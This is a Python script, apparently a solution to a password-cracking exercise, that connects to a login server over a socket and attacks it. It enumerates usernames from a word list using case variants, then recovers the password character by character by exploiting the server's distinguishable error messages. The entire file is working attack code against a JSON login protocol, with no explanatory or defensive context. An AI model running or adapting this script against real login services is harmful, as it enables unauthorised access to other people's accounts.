import itertools
import json
import socket
import sys


def generate_credential(credential):
    for i in itertools.product(*zip(credential.upper(), credential.lower())):
        yield "".join(i)


def get_username():
    for username in logins.readlines():
        for attempt in generate_credential(username.strip("\n")):
            credentials["login"] = attempt
            client_socket.send(json.dumps(credentials).encode())
            if json.loads(client_socket.recv(1024).decode())["result"] == "Wrong password!":
                return credentials


def get_password():
    alpha_digits = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    credentials["password"] = ""
    while True:
        for char in alpha_digits:
            credentials["password"] += char
            client_socket.send(json.dumps(credentials).encode())
            response = json.loads(client_socket.recv(1024).decode())["result"]
            if response == "Connection success!":
                return credentials
            elif response != "Exception happened during login":
                credentials["password"] = credentials["password"][:-1]
                continue
            else:
                break


if len(sys.argv) != 3:
    print("Please only provide hostname and port args!")
    exit(-1)
    
logins = open("logins.txt", "r+")
passwords = open("passwords.txt", "r+")

client_socket = socket.socket()
client_socket.connect((sys.argv[1], int(sys.argv[2])))  # 1 = hostname, 2 = port

credentials = {"login": "", "password": " "}
credentials = get_username()
credentials = get_password()
print(json.dumps(credentials))

client_socket.close()
